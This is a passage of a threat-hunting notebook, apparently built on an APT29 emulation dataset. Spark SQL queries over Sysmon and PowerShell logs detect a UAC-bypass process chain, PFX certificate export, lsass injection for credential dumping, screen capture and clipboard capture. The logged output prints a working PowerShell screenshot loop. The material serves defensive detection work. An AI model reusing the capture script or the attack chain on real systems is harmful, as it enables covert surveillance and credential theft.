<span class="sd">        WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND a.EventID = 1</span>
<span class="sd">          AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">      ) c</span>
<span class="sd">      ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">      WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND d.EventID = 1</span>
<span class="sd">        AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">    ) e</span>
<span class="sd">    ON f.ParentProcessGuid = e.ProcessGuid</span>
<span class="sd">    WHERE f.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND f.EventID = 1</span>
<span class="sd">      AND LOWER(f.Image) LIKE &#39;%accesschk%&#39;</span>
<span class="sd">) g</span>
<span class="sd">ON h.ProcessGuid = g.ProcessGuid</span>
<span class="sd">WHERE h.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND EventID = 7</span>
<span class="sd">    AND LOWER(ImageLoaded) LIKE &#39;%accesschk%&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Image loaded:
RuleName: -
UtcTime: 2020-05-02 03:04:34.959
ProcessGuid: {47ab858c-e342-5eac-d703-000000000400}
ProcessId: 9204
Image: C:\Program Files\SysinternalsSuite\accessChk.exe
ImageLoaded: C:\Program Files\SysinternalsSuite\accessChk.exe
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA1=691E81A8FA152F68FB8ACEFE8F59EA41DC995880,MD5=44F96457ADEB95AFD3F5457082D44538,SHA256=3247D21BC9BBBD8DF670A82E24BE754A2D58D2511EE64AFF0A1E3756CD288236,IMPHASH=8A672B6C29F8A80FC01C6E44A3CDEE82
Signed: false
Signature: -
SignatureStatus: Unavailable 
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="detection-type-general-correlated">
<h3>Detection Type:General(Correlated)<a class="headerlink" href="#detection-type-general-correlated" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:1FCE98FC-1FF9-41CB-9C25-0235729A2B01</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host h</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT f.ProcessGuid</span>
<span class="sd">    FROM apt29Host f</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT d.ProcessGuid, d.ParentProcessGuid</span>
<span class="sd">      FROM apt29Host d</span>
<span class="sd">      INNER JOIN (</span>
<span class="sd">        SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">        FROM apt29Host a</span>
<span class="sd">        INNER JOIN (</span>
<span class="sd">          SELECT ProcessGuid</span>
<span class="sd">          FROM apt29Host</span>
<span class="sd">          WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">              AND EventID = 1</span>
<span class="sd">              AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">              AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">        ) b</span>
<span class="sd">        ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">        WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND a.EventID = 1</span>
<span class="sd">          AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">      ) c</span>
<span class="sd">      ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">      WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND d.EventID = 1</span>
<span class="sd">        AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">    ) e</span>
<span class="sd">    ON f.ParentProcessGuid = e.ProcessGuid</span>
<span class="sd">    WHERE f.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND f.EventID = 1</span>
<span class="sd">      AND LOWER(f.Image) LIKE &#39;%accesschk%&#39;</span>
<span class="sd">) g</span>
<span class="sd">ON h.ProcessGuid = g.ProcessGuid</span>
<span class="sd">WHERE h.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND EventID = 7</span>
<span class="sd">    AND LOWER(ImageLoaded) LIKE &#39;%accesschk%&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Image loaded:
RuleName: -
UtcTime: 2020-05-02 03:04:34.959
ProcessGuid: {47ab858c-e342-5eac-d703-000000000400}
ProcessId: 9204
Image: C:\Program Files\SysinternalsSuite\accessChk.exe
ImageLoaded: C:\Program Files\SysinternalsSuite\accessChk.exe
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA1=691E81A8FA152F68FB8ACEFE8F59EA41DC995880,MD5=44F96457ADEB95AFD3F5457082D44538,SHA256=3247D21BC9BBBD8DF670A82E24BE754A2D58D2511EE64AFF0A1E3756CD288236,IMPHASH=8A672B6C29F8A80FC01C6E44A3CDEE82
Signed: false
Signature: -
SignatureStatus: Unavailable 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="b-1-private-keys">
<h2>6.B.1. Private Keys<a class="headerlink" href="#b-1-private-keys" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Exported a local certificate to a PFX file using PowerShell</p>
<p><strong>Criteria:</strong> powershell.exe creating a certificate file exported from the system</p>
<div class="section" id="id43">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id43" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:6392C9F1-D975-4F75-8A70-433DEDD7F622</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT d.ProcessGuid</span>
<span class="sd">    FROM apt29Host d</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">      FROM apt29Host a</span>
<span class="sd">      INNER JOIN (</span>
<span class="sd">        SELECT ProcessGuid</span>
<span class="sd">        FROM apt29Host</span>
<span class="sd">        WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">            AND EventID = 1</span>
<span class="sd">            AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">            AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">      ) b</span>
<span class="sd">      ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">      WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND a.EventID = 1</span>
<span class="sd">        AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">    ) c</span>
<span class="sd">    ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">    WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND d.EventID = 1</span>
<span class="sd">      AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON f.ProcessGuid = e.ProcessGuid</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">AND f.EventID = 11</span>
<span class="sd">AND LOWER(f.TargetFilename) LIKE &quot;%.pfx&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | File created:
RuleName: -
UtcTime: 2020-05-02 03:04:57.460
ProcessGuid: {47ab858c-e23d-5eac-c603-000000000400}
ProcessId: 3876
Image: C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\pbeesly\Downloads\coyn5igj.3io.pfx
CreationUtcTime: 2020-05-02 03:04:57.460 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="c-1-credential-dumping">
<h2>6.C.1. Credential Dumping<a class="headerlink" href="#c-1-credential-dumping" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Dumped password hashes from the Windows Registry by injecting a malicious DLL into Lsass.exe</p>
<p><strong>Criteria:</strong> powershell.exe injecting into lsass.exe OR lsass.exe reading Registry keys under HKLM:\SAM\SAM\Domains\Account\Users\</p>
<div class="section" id="id44">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id44" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:7B2CE2A5-4386-4EED-9A03-9B7D1049C4AE</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT d.ProcessGuid, d.ParentProcessGuid</span>
<span class="sd">    FROM apt29Host d</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">      FROM apt29Host a</span>
<span class="sd">      INNER JOIN (</span>
<span class="sd">        SELECT ProcessGuid</span>
<span class="sd">        FROM apt29Host</span>
<span class="sd">        WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">            AND EventID = 1</span>
<span class="sd">            AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">            AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">      ) b</span>
<span class="sd">      ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">      WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND a.EventID = 1</span>
<span class="sd">        AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">    ) c</span>
<span class="sd">    ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">    WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND d.EventID = 1</span>
<span class="sd">      AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON f.SourceProcessGuid = e.ParentProcessGuid</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND f.EventID = 8</span>
<span class="sd">    AND f.TargetImage LIKE &#39;%lsass.exe&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | CreateRemoteThread detected:
RuleName: -
UtcTime: 2020-05-02 03:05:16.623
SourceProcessGuid: {47ab858c-e1e4-5eac-b803-000000000400}
SourceProcessId: 2976
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGuid: {47ab858c-cad9-5eac-0c00-000000000400}
TargetProcessId: 736
TargetImage: C:\Windows\System32\lsass.exe
NewThreadId: 912
StartAddress: 0x00000117610E0000
StartModule: -
StartFunction: - 
-RECORD 1-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | CreateRemoteThread detected:
RuleName: -
UtcTime: 2020-05-02 03:05:16.623
SourceProcessGuid: {47ab858c-e1e4-5eac-b803-000000000400}
SourceProcessId: 2976
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGuid: {47ab858c-cad9-5eac-0c00-000000000400}
TargetProcessId: 736
TargetImage: C:\Windows\System32\lsass.exe
NewThreadId: 912
StartAddress: 0x00000117610E0000
StartModule: -
StartFunction: - 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="a-1-screen-capture">
<h2>7.A.1. Screen Capture<a class="headerlink" href="#a-1-screen-capture" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Captured and saved screenshots using PowerShell</p>
<p><strong>Criteria:</strong> powershell.exe executing the CopyFromScreen function from System.Drawing.dll</p>
<div class="section" id="id45">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id45" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:3B4E5808-3C71-406A-B181-17B0CE3178C9</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT d.ProcessGuid, d.ParentProcessGuid</span>
<span class="sd">    FROM apt29Host d</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">      FROM apt29Host a</span>
<span class="sd">      INNER JOIN (</span>
<span class="sd">        SELECT ProcessGuid</span>
<span class="sd">        FROM apt29Host</span>
<span class="sd">        WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">            AND EventID = 1</span>
<span class="sd">            AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">            AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">      ) b</span>
<span class="sd">      ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">      WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND a.EventID = 1</span>
<span class="sd">        AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">    ) c</span>
<span class="sd">    ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">    WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND d.EventID = 1</span>
<span class="sd">      AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON f.ProcessGuid = e.ProcessGuid</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND f.EventID = 7</span>
<span class="sd">    AND LOWER(f.ImageLoaded) LIKE &quot;%system.drawing.ni.dll&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Image loaded:
RuleName: -
UtcTime: 2020-05-02 03:06:42.583
ProcessGuid: {47ab858c-e374-5eac-d803-000000000400}
ProcessId: 3852
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Drawing\333e2b23be9a8210ee2068f514a332b9\System.Drawing.ni.dll
FileVersion: 4.8.3752.0 built by: NET48REL1
Description: .NET Framework
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: System.Drawing.dll
Hashes: SHA1=388B289E2FD96234E2C1E8AE777248BE2C3D327B,MD5=30588BB4DCBF9940A1B1ECD68634F797,SHA256=346A6BD85291B7C4D2410F5FED216BA88320CAD014FC5543E0F60A5895F3B48D,IMPHASH=00000000000000000000000000000000
Signed: false
Signature: -
SignatureStatus: Unavailable 
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="id46">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id46" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:B374D3E7-3580-441F-8D6E-48C40CBA7922</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Payload</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT d.ProcessId, d.ParentProcessId</span>
<span class="sd">    FROM apt29Host d</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">      FROM apt29Host a</span>
<span class="sd">      INNER JOIN (</span>
<span class="sd">        SELECT ProcessGuid</span>
<span class="sd">        FROM apt29Host</span>
<span class="sd">        WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">            AND EventID = 1</span>
<span class="sd">            AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">            AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">      ) b</span>
<span class="sd">      ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">      WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND a.EventID = 1</span>
<span class="sd">        AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">    ) c</span>
<span class="sd">    ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">    WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND d.EventID = 1</span>
<span class="sd">      AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON f.ExecutionProcessID = e.ProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">AND f.EventID = 4103</span>
<span class="sd">AND LOWER(f.Payload) LIKE &quot;%copyfromscreen%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Start-Job): &quot;Start-Job&quot;
ParameterBinding(Start-Job): name=&quot;Name&quot;; value=&quot;Screenshot&quot;
ParameterBinding(Start-Job): name=&quot;ScriptBlock&quot;; value=&quot; 
        Write-Host &quot;`nJobPID`n------`n$PID&quot;
        while($true){
            $RandomFileName = [System.IO.Path]::GetRandomFileName(); 
            $Filepath=&quot;$env:USERPROFILE\Downloads\$RandomFileName.bmp&quot;; 
            Add-Type -AssemblyName System.Windows.Forms; 
            Add-type -AssemblyName System.Drawing; 
            $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; 
            $Width = $Screen.Width; 
            $Height = $Screen.Height; 
            $Left = $Screen.Left; 
            $Top = $Screen.Top; 
            $bitmap = New-Object System.Drawing.Bitmap $Width, $Height; 
            $graphic = [System.Drawing.Graphics]::FromImage($bitmap); 
            $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size); 
            $bitmap.Save($Filepath); 
            Start-Sleep -Seconds 300
        } 
    &quot;
 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:2AA4D448-3893-4F31-9497-0F8E2B7E3CFD</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Payload</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT split(d.NewProcessId, &#39;0x&#39;)[1] as NewProcessId</span>
<span class="sd">    FROM apt29Host d</span>
<span class="sd">    INNER JOIN(</span>
<span class="sd">      SELECT a.ProcessId, a.NewProcessId</span>
<span class="sd">      FROM apt29Host a</span>
<span class="sd">      INNER JOIN (</span>
<span class="sd">        SELECT NewProcessId</span>
<span class="sd">        FROM apt29Host</span>
<span class="sd">        WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">            AND EventID = 4688</span>
<span class="sd">            AND LOWER(NewProcessName) LIKE &quot;%control.exe&quot;</span>
<span class="sd">            AND LOWER(ParentProcessName) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">      ) b</span>
<span class="sd">      ON a.ProcessId = b.NewProcessId</span>
<span class="sd">      WHERE LOWER(a.Channel) = &quot;security&quot;</span>
<span class="sd">        AND a.EventID = 4688</span>
<span class="sd">        AND a.MandatoryLabel = &quot;S-1-16-12288&quot;</span>
<span class="sd">        AND a.TokenElevationType = &quot;%%1937&quot;</span>
<span class="sd">    ) c</span>
<span class="sd">    ON d.ProcessId = c.NewProcessId</span>
<span class="sd">    WHERE LOWER(d.Channel) = &quot;security&quot;</span>
<span class="sd">      AND d.EventID = 4688</span>
<span class="sd">      AND d.NewProcessName LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON LOWER(hex(f.ExecutionProcessID)) = e.NewProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">AND f.EventID = 4103</span>
<span class="sd">AND LOWER(f.Payload) LIKE &quot;%copyfromscreen%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Start-Job): &quot;Start-Job&quot;
ParameterBinding(Start-Job): name=&quot;Name&quot;; value=&quot;Screenshot&quot;
ParameterBinding(Start-Job): name=&quot;ScriptBlock&quot;; value=&quot; 
        Write-Host &quot;`nJobPID`n------`n$PID&quot;
        while($true){
            $RandomFileName = [System.IO.Path]::GetRandomFileName(); 
            $Filepath=&quot;$env:USERPROFILE\Downloads\$RandomFileName.bmp&quot;; 
            Add-Type -AssemblyName System.Windows.Forms; 
            Add-type -AssemblyName System.Drawing; 
            $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; 
            $Width = $Screen.Width; 
            $Height = $Screen.Height; 
            $Left = $Screen.Left; 
            $Top = $Screen.Top; 
            $bitmap = New-Object System.Drawing.Bitmap $Width, $Height; 
            $graphic = [System.Drawing.Graphics]::FromImage($bitmap); 
            $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size); 
            $bitmap.Save($Filepath); 
            Start-Sleep -Seconds 300
        } 
    &quot;
 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="a-2-clipboard-data">
<h2>7.A.2. Clipboard Data<a class="headerlink" href="#a-2-clipboard-data" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Captured clipboard contents using PowerShell</p>
<p><strong>Criteria:</strong> powershell.exe executing Get-Clipboard</p>
<div class="section" id="id47">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id47" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:F4609F7E-C4DB-4327-91D4-59A58C962A02</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT d.ProcessId, d.ParentProcessId</span>
<span class="sd">  FROM apt29Host d</span>
<span class="sd">  INNER JOIN (</span>
<span class="sd">    SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT ProcessGuid</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND EventID = 1</span>
<span class="sd">          AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">    WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND a.EventID = 1</span>
<span class="sd">      AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">  ) c</span>
<span class="sd">  ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">  WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND d.EventID = 1</span>
<span class="sd">    AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON f.ExecutionProcessID = e.ProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">AND f.EventID = 4103</span>
